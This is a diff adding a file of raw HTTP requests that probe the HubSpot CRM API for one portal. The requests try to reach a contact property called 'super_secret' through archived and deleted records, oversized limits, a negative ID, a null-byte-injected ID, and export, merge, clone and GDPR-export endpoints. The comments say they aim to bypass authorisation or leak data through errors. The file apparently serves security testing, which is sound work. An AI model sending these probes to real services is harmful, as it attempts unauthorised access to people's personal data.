@@ -1,0 +1,111 @@
+# ========================================
+# EDGE CASES & UNUSUAL PATTERNS
+# Testing for logic bugs and race conditions
+# ========================================
+
+# REQUEST 1: Archived Contacts List
+GET /crm/v3/objects/contacts?portalId=46962361&archived=true&properties=firstname,super_secret,email&limit=100 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 2: Contact with Deleted Flag
+GET /crm/v3/objects/contacts/1?portalId=46962361&properties=firstname,super_secret,email&includeDeleted=true HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 3: Very Large Limit (might bypass pagination checks)
+POST /crm/v3/objects/contacts/search?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"filterGroups":[],"properties":["firstname","super_secret","email"],"limit":10000}
+
+
+# REQUEST 4: Negative Contact ID (integer overflow)
+GET /crm/v3/objects/contacts/-1?portalId=46962361&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 5: Contact ID as String with Special Chars
+GET /crm/v3/objects/contacts/1%00?portalId=46962361&properties=firstname,super_secret,email HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 6: Export Endpoint (might have different auth)
+POST /crm/v3/objects/contacts/export?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"properties":["firstname","super_secret","email"],"format":"CSV"}
+
+
+# REQUEST 7: Merge Contact Endpoint (error might leak data)
+POST /contacts/v1/contact/merge-vids/1?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"vidToMerge":999999}
+
+
+# REQUEST 8: Contact Timeline (activities might leak info)
+GET /crm/v3/objects/contacts/1/timeline?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 9: Engagement Associated with Contact
+GET /engagements/v1/engagements/associated/contact/1/paged?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 10: Contact Lists Membership
+GET /contacts/v1/lists/all/contacts/1?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 11: Contact Form Submissions
+GET /form-integrations/v1/submissions/contact/1?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 12: Contact Activity
+GET /sales/v3/contacts/1/activity?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+
+# REQUEST 13: GDPR Export (might bypass normal auth)
+POST /contacts/v1/contact/gdpr-export?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{"contactVid":"1"}
+
+
+# REQUEST 14: Clone Contact (error might reveal data)
+POST /contacts/v1/contact/clone/1?portalId=46962361 HTTP/2
+Host: api.hubapi.com
+Authorization: Bearer YOUR_API_KEY_HERE
+Content-Type: application/json
+
+{}
